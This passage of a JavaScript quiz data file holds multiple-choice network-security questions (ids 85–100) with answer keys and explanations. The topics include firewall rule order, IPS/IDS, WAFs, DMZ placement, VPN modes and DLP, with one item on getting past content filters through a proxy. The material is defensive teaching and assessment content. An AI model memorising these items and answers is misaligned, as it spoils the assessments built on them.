    "question": "A traditional stateless firewall rule base evaluates rules from top to bottom. Consider the following rules:\n1. `ALLOW TCP from ANY to ANY port 80`\n2. `DENY TCP from 198.51.100.50 to ANY port 80`\n3. `DENY ALL`\nAn attacker sends an HTTP packet on port 80 from the blocked IP address `198.51.100.50`. What action does the firewall take, and why?",
    "options": {
      "A": "The packet is permitted because firewalls follow a 'First-Match' evaluation logic, and Rule 1 matches the packet first.",
      "B": "The packet is dropped because Rule 2 explicitly denies that specific IP address.",
      "C": "The firewall crashes because the two rules represent a syntax conflict.",
      "D": "The packet is quarantined in a sandbox for 24 hours before being dropped."
    },
    "correct_answer": "A",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Firewall Rule Evaluation Order (First-Match)",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "TCS-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Firewalls evaluate rules sequentially from top to bottom and terminate processing on the 'First Match'. Because Rule 1 allows all traffic on port 80 from ANY source, the packet matches Rule 1 immediately and is permitted through. Rule 2 is never evaluated. Specific DENY rules must always be placed ABOVE general ALLOW rules.",
    "why_other_options_are_wrong": {
      "A": "Correct: First-match logic dictates that the general permit rule at line 1 allows the packet before reaching the deny rule at line 2.",
      "B": "Incorrect trap: Rule 2 is unreachable for port 80 traffic because Rule 1 already intercepted and permitted it.",
      "C": "Firewall configuration parsers do not crash on rule overlaps; they simply execute sequential evaluation.",
      "D": "Standard packet firewalls do not feature sandbox quarantine queues."
    },
    "real_world_application": "Performing firewall audit rule reordering to eliminate 'shadowed rules' that are inadvertently bypassed."
  },
  {
    "id": 86,
    "question": "What is the primary architectural downside or risk of deploying an Intrusion Prevention System (IPS) in active in-line blocking mode compared to a passive Intrusion Detection System (IDS)?",
    "options": {
      "A": "An IPS cannot inspect application-layer payloads, whereas an IDS can.",
      "B": "If an IPS produces a 'False Positive' (erroneously classifying legitimate business traffic as an attack), it actively drops legitimate customer transactions, and hardware failure can create a network-wide point of outage.",
      "C": "An IPS is completely illegal under modern ISO 27001 compliance standards.",
      "D": "An IPS requires manual human approval by an analyst for every single packet before forwarding it."
    },
    "correct_answer": "B",
    "topic": "Firewalls & Security Devices",
    "subtopic": "IPS Risks: False Positives & Inline Failure",
    "difficulty": "Hard",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Deloitte-style",
      "IBM-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Because an IPS sits directly in-line, any False Positive result causes legitimate traffic to be dropped, interrupting business operations. Additionally, if the inline IPS appliance experiences CPU exhaustion or crashes without a hardware bypass fail-open card, the entire network uplink goes down.",
    "why_other_options_are_wrong": {
      "A": "Modern IPS systems perform deep packet inspection (DPI) through Layer 7 payloads.",
      "B": "Correct: Active inline dropping means false positives directly disrupt business, and device failures risk total network downtime.",
      "C": "IPS deployment is strongly recommended and endorsed by ISO 27001 and PCI DSS.",
      "D": "IPS engines make automated real-time decisions within milliseconds; they do not wait for human approval."
    },
    "real_world_application": "Tuning IPS rules in 'Alert-Only' mode for 30 days in enterprise networks before switching signatures to 'Drop/Block'."
  },
  {
    "id": 87,
    "question": "An enterprise antivirus scanner uses two primary detection engines: Signature-Based Detection and Heuristic/Behavioral Detection. Why can an enterprise NOT rely solely on signature-based detection in 2026?",
    "options": {
      "A": "Signature detection causes 100% CPU utilization on all modern multi-core computers.",
      "B": "Signatures only function on text files and cannot inspect compiled binary `.exe` files.",
      "C": "Signature-based detection cannot detect Zero-Day malware or polymorphic malware whose binary hash has never been seen or cataloged before.",
      "D": "Signature detection requires an active satellite link to the manufacturer's laboratory."
    },
    "correct_answer": "C",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Antivirus: Signatures vs Heuristics",
    "difficulty": "Medium-Hard",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Infosys-style",
      "Accenture-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Signature-based detection relies on matching known static byte patterns or cryptographic file hashes (MD5/SHA-256) of previously analyzed malware. It is completely blind to new 'Zero-Day' threats and polymorphic malware that dynamically mutates its code on each infection. Heuristic and behavioral engines are required to detect suspicious activities.",
    "why_other_options_are_wrong": {
      "A": "Hash lookups are computationally lightweight and fast (O(1) table lookup).",
      "B": "Signatures were originally designed specifically for compiled binary executables.",
      "C": "Correct: Signatures rely on known samples; unknown zero-days and mutating polymorphic binaries easily evade static signatures.",
      "D": "Antivirus clients store local signature definition databases and update via standard internet connections."
    },
    "real_world_application": "Deploying modern Endpoint Detection and Response (EDR) platforms like CrowdStrike Falcon and Microsoft Defender for Endpoint."
  },
  {
    "id": 88,
    "question": "A network security architect is designing the security layout for an enterprise that hosts an external-facing public e-commerce web portal and a private backend database containing customer credit card details. Where should the web servers and database servers be placed?",
    "options": {
      "A": "Both the web servers and database servers should be placed directly on the public internet with public IP addresses.",
      "B": "Database servers should be placed in the DMZ, while web servers should be placed on employee desktop LAN subnets.",
      "C": "Both web servers and database servers should be placed in the DMZ with all ports open to ensure fast query latency.",
      "D": "The web servers should be placed in a Demilitarized Zone (DMZ), while the database servers should be placed in a restricted internal private network behind a second firewall."
    },
    "correct_answer": "D",
    "topic": "Firewalls & Security Devices",
    "subtopic": "DMZ Architecture & Network Segmentation",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Capgemini-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "In a classic multi-tiered DMZ (Demilitarized Zone) architecture, public-facing services (web/proxy servers) reside in the DMZ, accessible from the untrusted internet. The critical data repositories (databases) reside in a separate, isolated internal zone protected by an inner firewall that permits connections ONLY from the specific web servers on database port 3306/5432.",
    "why_other_options_are_wrong": {
      "A": "Exposing production databases directly to the public internet violates basic security principles.",
      "B": "Reversing the placement compromises internal employee subnets and exposes databases to external web attacks.",
      "C": "Placing databases in the DMZ exposes core sensitive assets if the DMZ perimeter is compromised.",
      "D": "Correct: DMZ for public-facing web tier, isolated internal network for database tier, enforcing strict defense-in-depth."
    },
    "real_world_application": "Standard 3-tier enterprise architecture (Web -> App -> Database) enforced via AWS Security Groups and VPC private subnets."
  },
  {
    "id": 89,
    "question": "What is the primary difference between a traditional Layer 3/4 Network Firewall and a Layer 7 Web Application Firewall (WAF)?",
    "options": {
      "A": "A Layer 3/4 firewall only inspects IP addresses and port numbers, completely blind to application payloads; a WAF deeply inspects HTTP/HTTPS traffic to detect web application attacks like SQL Injection and Cross-Site Scripting (XSS).",
      "B": "A Layer 3/4 firewall only runs on Windows, while a WAF only runs on Cisco routers.",
      "C": "A Layer 3/4 firewall prevents physical theft of server racks, while a WAF is a software password manager.",
      "D": "A WAF only inspects ICMP ping packets and has no understanding of web traffic."
    },
    "correct_answer": "A",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Traditional Firewall vs WAF",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Accenture-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A traditional L3/L4 firewall evaluates source/destination IP addresses and TCP/UDP ports. If port 443 is open, all HTTPS traffic passes through unrestricted. A Web Application Firewall (WAF) operates at Layer 7, decrypting and inspecting the actual HTTP payload, headers, cookies, and query strings to block SQLi, XSS, CSRF, and path traversal.",
    "why_other_options_are_wrong": {
      "A": "Correct: L3/L4 firewalls filter on IP/Port; WAFs inspect Layer 7 HTTP payloads to block web application exploits.",
      "B": "Both technologies are platform-agnostic and exist as appliances, cloud services, and software modules.",
      "C": "Physical security protects hardware; WAF is an application-layer network security device.",
      "D": "WAF specifically analyzes HTTP/HTTPS, not ICMP ping packets."
    },
    "real_world_application": "Deploying AWS WAF or Cloudflare WAF in front of web applications to block OWASP Top 10 exploits."
  },
  {
    "id": 90,
    "question": "A network administrator wants to monitor corporate network traffic for anomalous behavior using an Intrusion Detection System (IDS). Because the IDS appliance must not introduce any latency or risk of crashing the active production switches, which network configuration is used to feed traffic to the IDS?",
    "options": {
      "A": "Connecting the IDS directly in series between the core router and switch using an inline bridge",
      "B": "Configuring a Switched Port Analyzer (SPAN / Port Mirroring) or installing a physical optical TAP to copy traffic out-of-band to the IDS",
      "C": "Disabling all VLANs across the core enterprise switch",
      "D": "Running Telnet on port 23 across all switches to broadcast traffic"
    },
    "correct_answer": "B",
    "topic": "Firewalls & Security Devices",
    "subtopic": "IDS Network Taps & SPAN Ports",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Infosys-style",
      "HCLTech-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "To achieve non-intrusive monitoring with zero added latency, administrators configure SPAN (Port Mirroring) on managed switches or install passive optical TAPs. This sends a mirror duplicate of packet traffic out-of-band to the IDS. If the IDS fails or overloads, production traffic continues uninterrupted.",
    "why_other_options_are_wrong": {
      "A": "Connecting in series makes it an in-line device (IPS), which introduces latency and creates a single point of failure.",
      "B": "Correct: SPAN / TAP mirrors packets out-of-band, guaranteeing zero latency impact and zero risk of blocking production flow.",
      "C": "Disabling VLANs collapses network segmentation and has nothing to do with traffic capture.",
      "D": "Telnet is an unencrypted management protocol, completely unrelated to packet mirroring."
    },
    "real_world_application": "Configuring `monitor session 1 source interface gigabitethernet 0/1; monitor session 1 destination interface gigabitethernet 0/24` on Cisco Catalyst switches."
  },
  {
    "id": 91,
    "question": "An enterprise employee in the marketing department wants to access a competitor's website, but the corporate firewall blocks outbound HTTP requests to the 'Advertising & Marketing Competitors' category. The employee routes their browser traffic through a public external 'Forward Proxy'. What does this achieve for the employee?",
    "options": {
      "A": "It converts all HTTP traffic into unencrypted ARP broadcast requests.",
      "B": "It immediately grants the employee domain administrator privileges on the local Active Directory.",
      "C": "It bypasses the local content filter because the firewall only sees an outbound connection to the proxy's IP address rather than the blocked destination URL.",
      "D": "It permanently disables the employee's local operating system firewall."
    },
    "correct_answer": "C",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Forward Proxy & Filter Circumvention",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "Wipro-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A forward proxy accepts client requests and forwards them to the destination on the client's behalf. To an internal firewall or content filter, the employee is merely connecting to the proxy server's IP address. If the proxy connection is encrypted (HTTPS/SSH tunnel), the firewall cannot see the ultimate destination URL.",
    "why_other_options_are_wrong": {
      "A": "ARP operates strictly within the local Layer 2 broadcast domain and cannot route across the internet.",
      "B": "Network proxy routing has zero effect on Windows Active Directory user group privileges.",
      "C": "Correct: Routing through an external forward proxy obfuscates the destination from basic perimeter URL filters.",
      "D": "Connecting to a proxy does not alter local OS firewall service settings."
    },
    "real_world_application": "Enterprise deployment of Deep Packet Inspection (DPI) and blocking known anonymizer/proxy IP categories."
  },
  {
    "id": 92,
    "question": "A bank's internal network policy strictly states: 'Default-Deny' (Implicit Deny). What does this foundational firewall architecture rule mandate?",
    "options": {
      "A": "All traffic is automatically permitted unless it matches a specific deny rule at the top.",
      "B": "The firewall automatically denies all packets on weekends and holidays.",
      "C": "Only users with root administrator passwords are permitted to browse websites.",
      "D": "All traffic is denied by default unless there is an explicit, matching allow rule that permits it."
    },
    "correct_answer": "D",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Implicit Deny (Default-Deny) Principle",
    "difficulty": "Medium-Hard",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "TCS-style",
      "Capgemini-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "The principle of Default-Deny (Implicit Deny) states that anything that is not explicitly permitted must be forbidden. In firewalls, this is implemented as an invisible or explicit rule at the very bottom of the rule base: `DENY ALL TRAFFIC`. Only explicitly justified business ports/protocols are granted pass-through.",
    "why_other_options_are_wrong": {
      "A": "Allowing all traffic by default (Default-Allow / Implicit Permit) is an insecure anti-pattern.",
      "B": "Default-deny applies 24/7 to packet evaluation logic, not calendar dates.",
      "C": "Firewall rules evaluate network packet attributes (IP, Port, Protocol), not OS user account passwords.",
      "D": "Correct: Implicit Deny ensures that any packet not specifically authorized by an existing rule is dropped."
    },
    "real_world_application": "Foundational requirement in CIS Benchmarks, NIST SP 800-41, and PCI DSS compliance audits."
  },
  {
    "id": 93,
    "question": "An incident response team discovers an employee's machine running a remote-access backdoor. The backdoor generates outbound traffic on TCP port 80 (standard HTTP), but the payload is actually an encrypted, custom binary protocol used for Command & Control (C2). Why did this traffic pass right through the company's traditional legacy firewall?",
    "options": {
      "A": "Legacy L3/L4 firewalls only check the destination port number (Port 80 = Allowed), failing to inspect the actual application payload data to confirm if it is genuine HTTP.",
      "B": "Port 80 is mathematically hard-coded into Ethernet hardware chips to never be blocked.",
      "C": "The backdoor must have physically disconnected the firewall cables.",
      "D": "HTTP traffic cannot be inspected by any device on earth due to international privacy laws."
    },
    "correct_answer": "A",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Port-Based Firewall Evasion & NGFW Need",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "IBM-style",
      "Deloitte-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Traditional Layer 3/4 firewalls only inspect the packet header (IP addresses and Port numbers). If port 80 is open in the firewall rules, ANY protocol tunneling over port 80 is allowed through. A Next-Generation Firewall (NGFW) with App-ID / Deep Packet Inspection is required to analyze protocol semantics and block non-HTTP traffic on port 80.",
    "why_other_options_are_wrong": {
      "A": "Correct: Legacy firewalls trust the port number; malware exploits this by tunneling non-web protocols over permitted ports like 80 and 443.",
      "B": "Port numbers are software abstractions in the TCP header, not immutable hardware constraints.",
      "C": "Malware operates in software and cannot physically manipulate data center cabling.",
      "D": "Cleartext HTTP is universally inspectable by network middleboxes."
    },
    "real_world_application": "Migrating to Palo Alto Networks / Fortinet Next-Generation Firewalls with Application Identification (App-ID)."
  },
  {
    "id": 94,
    "question": "A mobile healthcare worker uses an iPad to access electronic medical health records (EMR) while traveling. The IT security team enforces a 'Full Tunnel' SSL VPN rather than a 'Split Tunnel' VPN. What is the fundamental difference between these two VPN configurations?",
    "options": {
      "A": "A Full Tunnel operates at 10 Gigabit speeds, while a Split Tunnel operates at dial-up speeds.",
      "B": "A Full Tunnel routes ALL client traffic (both corporate intranet and general public internet browsing) through the encrypted VPN tunnel, whereas a Split Tunnel routes ONLY internal corporate traffic through the VPN while sending public internet browsing directly out the local Wi-Fi.",
      "C": "A Split Tunnel encrypts traffic with AES, while a Full Tunnel uses unencrypted plaintext.",
      "D": "A Full Tunnel requires two separate physical network cables plugged into the iPad."
    },
    "correct_answer": "B",
    "topic": "Firewalls & Security Devices",
    "subtopic": "VPN Tunneling: Full vs Split Tunnel",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "In a Full Tunnel VPN, all traffic from the client is redirected through the corporate VPN gateway, allowing corporate security devices to inspect and filter all traffic. In a Split Tunnel VPN, only traffic destined for internal corporate IP subnets traverses the VPN; internet-bound traffic exits locally, saving corporate bandwidth but exposing the device to untrusted local network risks.",
    "why_other_options_are_wrong": {
      "A": "Both tunneling modes operate over existing client network link speeds.",
      "B": "Correct: Full tunnel forces 100% of device traffic through corporate security; split tunnel bifurcates corporate vs local internet traffic.",
      "C": "Both modes use identical encryption ciphers (such as AES-GCM) for the encapsulated traffic.",
      "D": "Tunneling configurations are software routing policies on the client's virtual network interface (TUN/TAP)."
    },
    "real_world_application": "Enforcing full-tunnel VPN in regulated industries (HIPAA, defense) to prevent endpoint internet leakage."
  },
  {
    "id": 95,
    "question": "A network security engineer configures a stateful firewall rule to allow internal hosts on subnet `10.0.1.0/24` to browse the web on external port 443 (HTTPS). Does the engineer need to create an explicit reverse inbound rule allowing external servers to send packets back to internal ephemeral ports?",
    "options": {
      "A": "Yes, an explicit rule `ALLOW ANY to 10.0.1.0/24 port ANY` must be created on the outside interface.",
      "B": "Yes, but only if the external web server is using an RSA certificate.",
      "C": "No, because stateful firewalls automatically record the outgoing connection state and dynamically permit the corresponding inbound return traffic belonging to established sessions.",
      "D": "No, because TCP port 443 is a broadcast port and does not require two-way communication."
    },
    "correct_answer": "C",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Stateful Connection Tracking & Dynamic Return Ports",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "TCS-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "This is the primary operational advantage of stateful inspection. When an internal client initiates an outbound connection, the firewall creates an entry in its state table (recording source IP, ephemeral port, destination IP, port 443, and TCP sequence numbers). Return packets matching this state entry are automatically permitted back through without needing any inbound permit rule.",
    "why_other_options_are_wrong": {
      "A": "Opening an explicit inbound rule from ANY to ANY destroys perimeter security and is only required on archaic stateless packet filters.",
      "B": "The certificate cipher suite is an application-layer detail that has no bearing on L4 state table tracking.",
      "C": "Correct: Stateful firewalls dynamically track outbound sessions and permit established return traffic automatically.",
      "D": "TCP is a strictly unicast, bidirectional, connection-oriented protocol."
    },
    "real_world_application": "Simplifying enterprise firewall policy management by only defining outbound egress rules for client subnets."
  },
  {
    "id": 96,
    "question": "A security analyst reviews an intrusion detection alert: 'Signature SID 201842: Possible Metasploit Meterpreter Reverse TCP Payload'. Upon investigating, the analyst finds that a system administrator was conducting an authorized internal penetration test against an isolated test environment. How is this alert categorized in security monitoring terminology?",
    "options": {
      "A": "False Negative",
      "B": "False Positive",
      "C": "True Negative",
      "D": "True Positive"
    },
    "correct_answer": "D",
    "topic": "Firewalls & Security Devices",
    "subtopic": "SOC Alert Terminology (True/False Positives)",
    "difficulty": "Hard",
    "question_type": "Log or Event Analysis",
    "company_pattern": [
      "Deloitte-style",
      "Accenture-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A True Positive occurs when a security device alerts on actual malicious activity or exploit code that was genuinely present on the wire. Even though the test was authorized, the Meterpreter exploit payload was genuinely transmitted and accurately identified by the IDS. (A False Positive occurs when benign traffic, like normal database queries, is mistakenly flagged as an attack).",
    "why_other_options_are_wrong": {
      "A": "A False Negative means an attack occurred but the security device failed to detect it.",
      "B": "Incorrect trap: An alert is only a False Positive if the signature triggered on benign, non-exploit data.",
      "C": "A True Negative means no attack occurred and no alert was generated.",
      "D": "Correct: The attack payload was genuinely present and correctly identified, making it a True Positive (even if authorized)."
    },
    "real_world_application": "Security Operations Center (SOC) alert triage differentiating benign true positives (authorized pentests) from malicious intrusions."
  },
  {
    "id": 97,
    "question": "An organization wants to prevent employees from leaking sensitive financial spreadsheets and customer credit card numbers to external personal cloud storage sites (like personal Dropbox or Google Drive). Which specialized security technology is specifically built to inspect outgoing network traffic and file attachments for sensitive data patterns and block unauthorized egress?",
    "options": {
      "A": "Data Loss Prevention (DLP)",
      "B": "Dynamic Host Configuration Protocol (DHCP)",
      "C": "Address Resolution Protocol (ARP)",
      "D": "Border Gateway Protocol (BGP)"
    },
    "correct_answer": "A",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Data Loss Prevention (DLP) Controls",
    "difficulty": "Medium-Hard",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Capgemini-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Data Loss Prevention (DLP) systems monitor, detect, and block sensitive data in use (endpoint actions), in motion (network egress), and at rest (storage). They use pattern matching (regex for credit cards/SSNs) and document fingerprinting to halt unauthorized exfiltration.",
    "why_other_options_are_wrong": {
      "A": "Correct: Data Loss Prevention (DLP) monitors and blocks unauthorized data exfiltration.",
      "B": "DHCP leases local IP configurations to hosts.",
      "C": "ARP maps IP addresses to MAC addresses on a local subnet.",
      "D": "BGP is the core routing protocol of the internet."
    },
    "real_world_application": "Enforcing Microsoft Purview / Symantec Network DLP policies blocking transmission of PCI DSS credit card numbers."
  },
  {
    "id": 98,
    "question": "A company deploys an IPsec VPN tunnel between its headquarters in Bangalore and a regional office in Mumbai. The engineers must choose between 'Transport Mode' and 'Tunnel Mode'. What is the critical distinction?",
    "options": {
      "A": "Transport Mode uses asymmetric RSA, while Tunnel Mode uses symmetric AES.",
      "B": "Transport Mode encrypts only the payload leaving the original IP header visible (used host-to-host), while Tunnel Mode encrypts the entire original IP packet (header and payload) and wraps it inside a brand-new outer IP header (used gateway-to-gateway).",
      "C": "Transport Mode is only compatible with wireless 5G connections.",
      "D": "Tunnel Mode does not provide encryption and only provides routing."
    },
    "correct_answer": "B",
    "topic": "Firewalls & Security Devices",
    "subtopic": "IPsec Modes: Transport vs Tunnel",
    "difficulty": "Hard",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "TCS-style",
      "IBM-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "In IPsec Transport Mode, only the transport-layer payload is encrypted; the original IP header remains exposed, making it suitable for end-to-end host communication. In Tunnel Mode, the entire original IP packet (including internal source and destination IPs) is encrypted and encapsulated into a new outer IP header between VPN gateways, hiding internal network topologies.",
    "why_other_options_are_wrong": {
      "A": "Both modes use identical cryptographic ciphers (ESP with AES-GCM or AES-CBC).",
      "B": "Correct: Transport encrypts payload only; Tunnel encrypts the entire original packet and adds a new outer IP header for site-to-site connectivity.",
      "C": "IPsec modes are Layer 3 protocols independent of physical link technologies.",
      "D": "IPsec Tunnel Mode provides robust confidentiality via the Encapsulating Security Payload (ESP)."
    },
    "real_world_application": "Configuring Site-to-Site IPsec VPN tunnels between Cisco ASA and FortiGate routers using Tunnel Mode."
  },
  {
    "id": 99,
    "question": "An enterprise web server cluster experiences thousands of automated credential-stuffing login requests per minute. The requests use valid HTTP syntax and do not contain SQL injection or XSS strings. Which security device and feature is best suited to detect and mitigate this automated bot traffic?",
    "options": {
      "A": "Stateless Layer 3 Packet Filter with static IP blocking",
      "B": "Local Loopback Adapter",
      "C": "Web Application Firewall (WAF) / Bot Management solution utilizing CAPTCHA, JavaScript behavioral fingerprinting, and IP reputation rate limiting",
      "D": "Replacing optical patch cables with Cat6 copper cabling"
    },
    "correct_answer": "C",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Bot Management & WAF Rate Limiting",
    "difficulty": "Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Accenture-style",
      "LTIMindtree-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Credential stuffing uses valid HTTP requests that pass standard syntax checks. A WAF with Bot Management detects automated client traits (lack of mouse movements, headless browser fingerprints, rapid iteration) and enforces challenges (like Cloudflare Turnstile / CAPTCHA) and rate limiting.",
    "why_other_options_are_wrong": {
      "A": "Stateless filters cannot detect distributed botnet IP rotations or measure request rate frequencies per endpoint.",
      "B": "Loopback adapters are internal software host interfaces (127.0.0.1).",
      "C": "Correct: Modern WAFs with Bot Management evaluate behavioral telemetry and challenge automated botnets.",
      "D": "Physical cables have no relationship to application-layer botnet defenses."
    },
    "real_world_application": "Deploying Cloudflare Bot Management or AWS WAF Bot Control to mitigate account takeover (ATO) attacks."
  },
  {
    "id": 100,
    "question": "An enterprise security architecture integrates: 1. A Next-Gen Firewall (NGFW) at the perimeter, 2. An in-line IPS, 3. A Reverse Proxy WAF in front of web applications, 4. Host-based Endpoint Detection and Response (EDR) on all servers, and 5. Database activity monitoring with transparent encryption. If an external attacker discovers a zero-day vulnerability that bypasses the perimeter firewall, which security principle guarantees that the attacker is still detected and blocked by subsequent layers?",
    "options": {
      "A": "The Principle of Open Design",
      "B": "Security through Obscurity",
      "C": "Kerckhoffs's Principle",
      "D": "Defense in Depth (Layered Security)"
    },
    "correct_answer": "D",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Defense in Depth & Holistic Enterprise Defense",
    "difficulty": "Medium-Hard",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Accenture-style",
      "TCS-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Defense in Depth (Layered Defense) ensures that multiple diverse security controls are layered throughout an information system. If a single defensive barrier fails (such as an exploit bypassing a perimeter firewall), subsequent barriers (IPS, WAF, EDR, database access controls) prevent the adversary from achieving their objective.",
    "why_other_options_are_wrong": {
      "A": "The Principle of Open Design states that security should not depend on keeping algorithms secret.",
      "B": "Security through obscurity relies on keeping system flaws secret rather than implementing robust layered controls.",
      "C": "Kerckhoffs's Principle applies specifically to cryptosystem key secrecy.",
      "D": "Correct: Layering overlapping independent defensive controls to eliminate single points of security failure is Defense in Depth."
    },
    "real_world_application": "Enterprise Zero Trust and Defense-in-Depth architectural design required by NIST SP 800-207."
  }
];
if (typeof module !== 'undefined' && module.exports) { module.exports = questionsData; }
